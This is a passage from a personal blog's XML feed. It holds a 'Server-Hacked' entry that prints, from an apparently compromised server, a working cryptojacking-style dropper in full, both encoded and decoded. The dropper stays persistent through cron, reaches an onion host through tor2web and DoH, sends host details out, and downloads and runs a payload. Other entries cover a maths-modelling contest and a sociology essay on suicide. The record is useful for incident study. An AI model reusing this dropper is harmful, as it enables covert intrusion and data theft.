punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          matches<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            path<span class="token operator">:</span> currPath<span class="token punctuation">,</span>            match<span class="token operator">:</span> line          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> matches<span class="token punctuation">&#125;</span><span class="token keyword">const</span> paths <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'./server.ts'</span><span class="token punctuation">,</span> <span class="token string">'./routes'</span><span class="token punctuation">,</span> <span class="token string">'./lib'</span><span class="token punctuation">,</span> <span class="token string">'./data'</span><span class="token punctuation">,</span> <span class="token string">'./frontend/src/app'</span><span class="token punctuation">]</span><span class="token keyword">const</span> match <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">vuln-code-snippet start.*</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challenge<span class="token punctuation">.</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token keyword">const</span> matches <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fileSniff</span><span class="token punctuation">(</span>paths<span class="token punctuation">,</span> match<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Server-Hacked</title>
    <link href="/2021/02/21/Server-Hacked/"/>
    <url>/2021/02/21/Server-Hacked/</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─<span class="token comment"># lsof -c uBXOvYBM</span>COMMAND     PID <span class="token environment constant">USER</span>   FD      TYPE    DEVICE SIZE/OFF      NODE NAMEuBXOvYBM <span class="token number">318196</span> root  cwd       DIR     <span class="token number">254,1</span>     <span class="token number">4096</span>         <span class="token number">2</span> /uBXOvYBM <span class="token number">318196</span> root  rtd       DIR     <span class="token number">254,1</span>     <span class="token number">4096</span>         <span class="token number">2</span> /uBXOvYBM <span class="token number">318196</span> root  txt       REG     <span class="token number">254,1</span>   <span class="token number">819252</span>   <span class="token number">1048698</span> /root/08db56cb75fd057be28be1007c5f4424 <span class="token punctuation">(</span>deleted<span class="token punctuation">)</span>uBXOvYBM <span class="token number">318196</span> root  DEL       REG      <span class="token number">0,14</span>          <span class="token number">127380184</span> /anon_hugepageuBXOvYBM <span class="token number">318196</span> root  DEL       REG      <span class="token number">0,14</span>           <span class="token number">17030308</span> /anon_hugepageuBXOvYBM <span class="token number">318196</span> root  DEL       REG      <span class="token number">0,14</span>           <span class="token number">17030306</span> /anon_hugepageuBXOvYBM <span class="token number">318196</span> root  mem       REG     <span class="token number">254,1</span>      <span class="token number">582</span>    <span class="token number">925625</span> /usr/share/zoneinfo/PRCuBXOvYBM <span class="token number">318196</span> root    0u  a_inode      <span class="token number">0,13</span>        <span class="token number">0</span>      <span class="token number">8043</span> <span class="token punctuation">[</span>eventfd<span class="token punctuation">]</span>uBXOvYBM <span class="token number">318196</span> root    1u  a_inode      <span class="token number">0,13</span>        <span class="token number">0</span>      <span class="token number">8043</span> <span class="token punctuation">[</span>eventfd<span class="token punctuation">]</span>uBXOvYBM <span class="token number">318196</span> root    2r      CHR       <span class="token number">1,3</span>      0t0         <span class="token number">4</span> /dev/nulluBXOvYBM <span class="token number">318196</span> root    3u  a_inode      <span class="token number">0,13</span>        <span class="token number">0</span>      <span class="token number">8043</span> <span class="token punctuation">[</span>eventpoll<span class="token punctuation">]</span>uBXOvYBM <span class="token number">318196</span> root    4r     FIFO      <span class="token number">0,12</span>      0t0  <span class="token number">17030300</span> pipeuBXOvYBM <span class="token number">318196</span> root    5w     FIFO      <span class="token number">0,12</span>      0t0  <span class="token number">17030300</span> pipeuBXOvYBM <span class="token number">318196</span> root    6r     FIFO      <span class="token number">0,12</span>      0t0  <span class="token number">17030299</span> pipeuBXOvYBM <span class="token number">318196</span> root    7w     FIFO      <span class="token number">0,12</span>      0t0  <span class="token number">17030299</span> pipeuBXOvYBM <span class="token number">318196</span> root    8u  a_inode      <span class="token number">0,13</span>        <span class="token number">0</span>      <span class="token number">8043</span> <span class="token punctuation">[</span>eventfd<span class="token punctuation">]</span>uBXOvYBM <span class="token number">318196</span> root    9w      REG     <span class="token number">254,1</span>        <span class="token number">7</span>    <span class="token number">262168</span> /tmp/.X11-unix/11uBXOvYBM <span class="token number">318196</span> root   10u     IPv4 <span class="token number">129901501</span>      0t0       TCP iZwgo7e0o4xyirZ:41142-<span class="token operator">></span>static.99.90.243.136.clients.your-server.de:http-alt <span class="token punctuation">(</span>ESTABLISHED<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─<span class="token comment"># crontab -l </span><span class="token number">33</span> * * * * /root/.systemd-service.sh <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">exec</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV<span class="token builtin class-name">echo</span> blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo<span class="token operator">=</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">exec</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV<span class="token builtin class-name">echo</span> blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo<span class="token operator">=</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV<span class="token builtin class-name">exec</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span><span class="token builtin class-name">:</span><span class="token environment constant">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> x:<span class="token punctuation">$(</span>id -u<span class="token punctuation">)</span>: /etc/passwd<span class="token operator">|</span><span class="token function">cut</span> -d: -f6<span class="token variable">)</span></span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"curl -4fsSLkA- -m200"</span><span class="token variable">)</span></span><span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id"</span><span class="token variable">)</span></span><span class="token function-name function">sockz</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token assign-left variable">n</span><span class="token operator">=</span><span class="token punctuation">(</span>doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch<span class="token punctuation">)</span><span class="token assign-left variable">p</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"dns-query?name=relay.tor2socks.in"</span><span class="token variable">)</span></span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$c https://$<span class="token punctuation">&#123;</span>n<span class="token punctuation">[</span><span class="token punctuation">$((</span><span class="token environment constant">RANDOM</span>%10<span class="token punctuation">)</span><span class="token variable">)</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>/<span class="token variable">$p</span> <span class="token operator">|</span> <span class="token function">grep</span> -oE <span class="token string">"<span class="token entity" title="\b">\b</span>([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span><span class="token function">tr</span> <span class="token string">' '</span> <span class="token string">'<span class="token entity" title="\n">\n</span>'</span><span class="token operator">|</span><span class="token function">grep</span> -Ev <span class="token punctuation">[</span>.<span class="token punctuation">]</span><span class="token number">0</span><span class="token operator">|</span><span class="token function">sort</span> -uR<span class="token operator">|</span><span class="token function">head</span> -n <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function-name function">fexe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token builtin class-name">.</span> <span class="token environment constant">$HOME</span> /usr/bin <span class="token variable">$d</span> /var/tmp <span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token builtin class-name">exit</span> <span class="token operator">></span> <span class="token variable">$i</span>/i <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x <span class="token variable">$i</span>/i <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> <span class="token variable">$i</span> <span class="token operator">&amp;&amp;</span> ./i <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f i <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token keyword">done</span><span class="token punctuation">&#125;</span><span class="token function-name function">u</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sockz<span class="token assign-left variable">f</span><span class="token operator">=</span>/int.<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -m<span class="token variable">)</span></span><span class="token assign-left variable">x</span><span class="token operator">=</span>./<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token operator">|</span>md5sum<span class="token operator">|</span><span class="token function">cut</span> -f1 -d-<span class="token variable">)</span></span><span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -4fsSLk checkip.amazonaws.com<span class="token operator">||</span><span class="token function">curl</span> -4fsSLk ip.sb<span class="token variable">)</span></span>_<span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span>_<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -m<span class="token variable">)</span></span>_<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -n<span class="token variable">)</span></span>_<span class="token variable"><span class="token variable">$(</span><span class="token function">ip</span> a<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'inet '</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token punctuation">&#123;</span><span class="token string">'print <span class="token variable">$2</span>'</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>md5sum<span class="token operator">|</span><span class="token function">awk</span> <span class="token punctuation">&#123;</span><span class="token string">'print <span class="token variable">$1</span>'</span><span class="token punctuation">&#125;</span><span class="token variable">)</span></span>_<span class="token variable"><span class="token variable">$(</span><span class="token function">crontab</span> -l<span class="token operator">|</span>base64 -w0<span class="token variable">)</span></span><span class="token variable">$c</span> -x socks5h://<span class="token variable">$s</span>:9050 <span class="token variable">$t</span>.onion<span class="token variable">$f</span> -o<span class="token variable">$x</span> -e<span class="token variable">$r</span> <span class="token operator">||</span> <span class="token variable">$c</span> <span class="token variable">$1</span><span class="token variable">$f</span> -o<span class="token variable">$x</span> -e<span class="token variable">$r</span><span class="token function">chmod</span> +x <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token punctuation">;</span><span class="token function">rm</span> -f <span class="token variable">$x</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token for-or-select variable">h</span> <span class="token keyword">in</span> tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su <span class="token keyword">do</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">ls</span> /proc/<span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> -n <span class="token number">1</span> /tmp/.X11-unix/01<span class="token variable">)</span></span>/status<span class="token punctuation">;</span> <span class="token keyword">then</span>fexe<span class="token punctuation">;</span>u <span class="token variable">$t</span><span class="token builtin class-name">.</span><span class="token variable">$h</span><span class="token function">ls</span> /proc/<span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> -n <span class="token number">1</span> /tmp/.X11-unix/01<span class="token variable">)</span></span>/status <span class="token operator">||</span> <span class="token punctuation">(</span>cd /tmp<span class="token punctuation">;</span>u <span class="token variable">$t</span><span class="token builtin class-name">.</span><span class="token variable">$h</span><span class="token punctuation">)</span><span class="token function">ls</span> /proc/<span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> -n <span class="token number">1</span> /tmp/.X11-unix/01<span class="token variable">)</span></span>/status <span class="token operator">||</span> <span class="token punctuation">(</span>cd /dev/shm<span class="token punctuation">;</span>u <span class="token variable">$t</span><span class="token builtin class-name">.</span><span class="token variable">$h</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token builtin class-name">break</span><span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>有时间分析一下此样本</p>]]></content>
    
    
    <categories>
      
      <category>记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MCM2021</title>
    <link href="/2021/02/10/MCM2021/"/>
    <url>/2021/02/10/MCM2021/</url>
    
    <content type="html"><![CDATA[<h2 id="before-the-contest"><a class="markdownIt-Anchor" href="#before-the-contest"></a> Before the Contest</h2><p>Having tried to read some books about <a href="https://book.douban.com/subject/3393384/">mathematical modeling</a>, I found it difficult for me to concentrating on the obscure procedures of mathematical modeling, though I have, or just pretend to have interests exploring the beauty of math.</p><p>So I turned to books about ML, assuming that it may help me understanding the nature of mathematical modeling from a programmer’s perspective. I scanned through quite a few books on the shelf and finally read two books, one for the basic mathematical background, another for hands-on experience. After a few days I learned about a few fundamental concepts about ML such as its six/eight types, its challenges and main steps of ML projects on regression and classification.</p><p>I read about 100 pages before I got bored about the cumbersome routines of ML projects, like finding correlations, preprocessing data, building pipelines, cross validation, etc. It seems that all that ML do is to maintain a model which is able to predict real-world data and guess the most suitable parameters of from the training set, you still need to watch on it and the accuracy is not guaranteed.</p><h2 id="during-the-contest"><a class="markdownIt-Anchor" href="#during-the-contest"></a> During the Contest</h2><p>Since we have no interests in problems A-E we chose problem F, which seems to be more friendly to newbies.</p><p>Due to lack of experience and weakness in math, I have no ideas about the problem. So I kept search for information on many websites, seeking discussions. It turns out I was wasting time because nobody would share their ideas and solutions in public forums. So I tried to search for papers about higher education system assessment.</p><p>Luckily I found <a href="https://www.hindawi.com/journals/ddns/2020/6769202/">one paper</a> dealing with this, which also include mathematical formulas! A ready-made solution with IEW and TOPSIS method, that is what we need. Having it to my partner who also found it useful, I began to collect data on tertiary education, which is quite time-consuming. To summarize:</p><ul><li>GA’s official websites are useless not only because the lack of data download service but also for the indicators they provide are of no use.</li><li>Do not waste time on ZhiHu, those guys just want to steal money by providing second-hand data.</li><li>There may be ready-made datasets on Kaggle or GitHub, but they may not be up to date.</li><li>CNKI charge for downloading the yearbook. And foreign data platforms like <a href="https://www.statista.com/">statista</a> even charge more!</li><li><a href="http://uis.unesco.com">UIS</a>, OECD and WorldBank are reliable! All the official data come from them and they provide them for free!</li></ul><p>It was not until I got many official data that I realized I had not chose the indicators. There are so many rows and columns so I spent much time on data filtering, googling hundreds of time for pandas usage. But when I became proficient in dealing with <code>DataFrame</code>, I found the data incomplete for building models because there are always lacks for some countries and some years. You need to do loads of stuff to get the filled data, adjust weights of different indicators and make complex calculations to get the final score.</p><p>It was too late when I realized that I had not searched for existing rankings for higher education systems. I already known QS, ARWU, THE rankings before. But they are ranking systems for universities, not for countries. I finally found two rankings of higher education systems. One of them from QS only shows the ranking result without any detail. Luckily, another ranking from <a href="https://universitas21.com/what-we-do/u21-rankings/u21-ranking-national-higher-education-systems-2020">U21</a> is much more comprehensive because they provide a 50-page report which illustrated their methodology and the indicators they chose.</p><p><a href="https://www.education-progress.org/">https://www.education-progress.org/</a></p><p><a href="https://www.oecd.org/education/education-at-a-glance/">https://www.oecd.org/education/education-at-a-glance/</a></p><p><a href="http://uis.unesco.org/en/topic/sustainable-development-goal-4">http://uis.unesco.org/en/topic/sustainable-development-goal-4</a></p><h2 id="after-the-contest"><a class="markdownIt-Anchor" href="#after-the-contest"></a> After the Contest</h2><p>What I have gained from MCM?</p><ul><li>LaTex<ul><li>how to write math formula</li><li>how to include graphics</li><li>how to adjust styles</li><li>how to generate tables</li></ul></li><li>Pandas<ul><li>how to deal with real-world datasets</li><li>how to plot and save many large figures</li></ul></li><li>Data Source<ul><li><a href="http://data.uis.unesco.org/">http://data.uis.unesco.org/</a></li><li><a href="https://data.oecd.org/">https://data.oecd.org/</a></li><li><a href="https://data.worldbank.org/">https://data.worldbank.org/</a></li></ul></li></ul><p>What I have lost to MCM?</p><ul><li>Money!!!</li><li>Time</li><li>Trust</li><li>Sleep 😴</li></ul>]]></content>
    
    
    <categories>
      
      <category>竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自杀研究：读书报告与案例分析</title>
    <link href="/2020/12/30/Suicide/"/>
    <url>/2020/12/30/Suicide/</url>
    
    <content type="html"><![CDATA[<h2 id="自杀论读书报告自杀与晚期资本主义社会"><a class="markdownIt-Anchor" href="#自杀论读书报告自杀与晚期资本主义社会"></a> 《自杀论》读书报告——自杀与晚期资本主义社会</h2><p>说到自杀，人们往往把它当成一种心理现象看待，尝试分析自杀者的精神状态和个人经历，从中寻找其自杀的独特原因。然而，涂尔干在他的著作《自杀论》中指出，自杀其实更是一种社会现象，背后有着深层次的社会原因。在最近年轻人自杀频频发生的背景下，我不能不赞同涂尔干从社会学视角解释自杀现象的合理性，读完《自杀论》后，我尝试运用书中理论理解当今社会自杀频发的原因。</p><p>《自杀论》是一部严谨翔实的社会学著作，在此不对其论证过程做展开，仅简要介绍本书的主要结论为后文的讨论做铺垫。</p><p>涂尔干在对欧洲各国自杀数据进行分析的基础上，把自杀分成三种：利己型自杀、利他型自杀和失范型自杀。</p><p>利己型自杀是新教传播以来个人主义的兴盛而导致的，基于宗教和家庭的传统集体生活渐渐瓦解，个人在得到了相对的自由后却也失去了可依附的对象，脱离了集体活动和社会关系后，生活成了无意义的虚无，既然已看不到生命的价值，自杀便不足为奇了。</p><p>利他型自杀恰恰相反，是由于个人过度融入集体生活，社会对人施以严格控制。为了获得集体的肯定和荣誉，担心被集体所排斥，个人不自觉地在社会给予的压力下朝着集体的目标前进，甚至不惜放弃自己的生命，而他人的自杀又是新一轮狂热的开始。</p><p>失范型自杀是19世纪欧洲典型而普遍的自杀类型，资本主义飞速发展，人们的欲望不断增长，传统的法律道德、价值观念等社会规范遭到挑战，人们毫无准备地被抛置于新的社会秩序中，这种不稳定的社会环境极易滋生暴力，无论是杀人或是自杀。</p><p>当我套用涂尔干关于自杀的理论于当代社会时，竟也能发现一些相通之处。</p><p>现代社会的个人主义倾向已是老生常谈，交通工具的更新和通信技术的发展固然让地球村这一概念深入人心，现实生活中的我们却经常性地处于孤独之中，社会原子化让我们各怀心事又各自为战，功利主义编织的大网没有将我们连接在一起，而是将我们分隔在一个个互相凝视的茧房中。我们自由恋爱成家、自由寻找工作，也能自由地抛弃或被抛弃。“一切皆流，无物常驻”其实本是常态，可资本主义为了让人安分工作又总会提供一种虚假的归属感，“把企业当成家”是再常见不过的口号，然而铁打的营盘流水的兵，当经济状况恶化时，雇佣关系的本质就暴露无疑，下岗失业的残酷现实让幻梦破灭，痛苦更甚。回首向来萧瑟处，也无上帝也无亲，失去了宗教和家庭锁链的我们，真的得到了整个世界吗？或许我们还没做好迎接生命中不可承受之轻的准备？正如马克思所说，人是一切社会关系的总和，一旦脱离社会，个体的生命是那么渺小和短暂，既然自己终究要毁灭，那自杀不过是让这一结局提前到来而已。</p><p>与此同时，个人主义被大力宣扬的背后，却是资本主义文化工业透过大众传媒在操纵着人们的思想，流行文化将批量生产的景观投射给所有社会成员，人们看似能自由选择自己的生活方式，却无时无刻都在被意识